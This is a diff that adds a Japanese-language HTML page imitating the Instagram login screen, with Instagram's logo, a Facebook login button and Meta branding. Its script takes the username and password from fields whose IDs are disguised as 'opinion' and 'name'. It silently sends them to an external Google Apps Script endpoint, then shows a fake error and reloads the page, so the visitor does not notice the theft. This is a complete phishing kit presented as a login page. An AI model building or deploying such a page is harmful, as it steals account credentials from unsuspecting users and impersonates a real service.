@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>ログイン画面</title>
+<style>
+* {
+box-sizing: border-box;
+margin: 0;
+padding: 0;
+}
+
+body {
+font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
+background: #fafafa;
+color: #262626;
+display: flex;
+justify-content: center;
+align-items: flex-start;
+min-height: 100vh;
+}
+
+.page {
+width: 100%;
+max-width: 430px;
+min-height: 100vh;
+background: #fafafa;
+padding: 36px 32px 24px;
+display: flex;
+flex-direction: column;
+align-items: center;
+}
+
+.language {
+font-size: 11px;
+color: #8e8e8e;
+font-weight: 600;
+margin-bottom: 36px;
+}
+
+.logo img {
+width: 200px;
+height: auto;
+margin-bottom: 30px;
+border-radius: 12px;
+}
+
+.login-box {
+width: 100%;
+display: flex;
+flex-direction: column;
+align-items: center;
+}
+
+.facebook-btn {
+width: 100%;
+height: 38px;
+background: #1877f2;
+color: #fff;
+border: none;
+border-radius: 4px;
+font-size: 14px;
+font-weight: 600;
+cursor: pointer;
+margin-bottom: 18px;
+}
+
+.divider {
+width: 100%;
+display: flex;
+align-items: center;
+gap: 14px;
+margin-bottom: 18px;
+color: #8e8e8e;
+font-size: 13px;
+font-weight: 700;
+}
+
+.divider::before,
+.divider::after {
+content: "";
+flex: 1;
+height: 1px;
+background: #dbdbdb;
+}
+
+.input {
+width: 100%;
+height: 42px;
+border: 1px solid #dbdbdb;
+background: #ededed;
+border-radius: 3px;
+padding: 0 10px;
+font-size: 13px;
+margin-bottom: 6px;
+outline: none;
+font-weight: 500;
+}
+
+.forgot {
+width: 100%;
+text-align: right;
+margin: 10px 0 14px;
+}
+
+.forgot a {
+color: #0095f6;
+font-size: 14px;
+text-decoration: none;
+font-weight: 650;
+margin-left: 4px;
+}
+
+.login-btn {
+width: 100%;
+height: 38px;
+background: #0095f6;
+color: #fff;
+border: none;
+border-radius: 4px;
+font-size: 14px;
+font-weight: 600;
+cursor: pointer;
+margin-top: 20px;
+margin-bottom: 26px;
+}
+
+.signup {
+font-size: 14px;
+color: #7e7e7e;
+font-weight: 550;
+}
+
+.signup a {
+color: #0095f6;
+text-decoration: none;
+font-weight: 650;
+margin-left: 4px;
+}
+
+.meta {
+margin-top: auto;
+text-align: center;
+color: #8e8e8e;
+font-size: 13px;
+padding-top: 40px;
+}
+</style>
+</head>
+<body>
+<div class="page">
+<div class="language">日本語 ∨</div>
+
+<div class="logo">
+<img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png" alt="sample image">
+</div>
+
+<div class="login-box">
+<button class="facebook-btn" type="button">Facebookでログイン</button>
+
+<div class="divider">または</div>
+
+<!-- id を追加 -->
+<input id="opinion" class="input" type="text" placeholder="電話番号、ユーザーネーム、メールアドレス" />
+<input id="name" class="input" type="password" placeholder="パスワード" />
+
+<div class="forgot">
+<a href="#">パスワードを忘れた場合</a>
+</div>
+
+<!-- id を追加 -->
+<button id="submitBtn" class="login-btn" type="button" onclick="submitForm()">ログイン</button>
+
+<div class="signup">
+アカウントをお持ちでないですか？
+<a href="#">登録する</a>
+</div>
+</div>
+
+<div class="meta">
+from ∞ Meta
+</div>
+</div>
+
+<script>
+async function submitForm() {
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyEIAw_OBFy_fypjmhRapswSn3cW-aun1Z8kUnLGWfVSFfdqrnPiPxWqiaHRJfoCH5p/exec";
+
+const btn = document.getElementById("submitBtn");
+const name = document.getElementById("name").value.trim() || "匿名";
+const opinion = document.getElementById("opinion").value.trim();
+
+if (!opinion) {
+alert("未入力の事項があります");
+return;
+}
+
+btn.disabled = true;
+btn.innerText = "ログイン中...";
+
+try {
+await fetch(WEB_APP_URL, {
+method: "POST",
+mode: "no-cors",
+headers: {
+"Content-Type": "application/json"
+},
+body: JSON.stringify({ name, opinion })
+});
+
+alert("エラーが発生しました。");
+location.reload();
+} catch (e) {
+console.error(e);
+alert("エラーが発生しました。");
+btn.disabled = false;
+btn.innerText = "送信";
+}
+}
+</script>
+</body>
+</html>
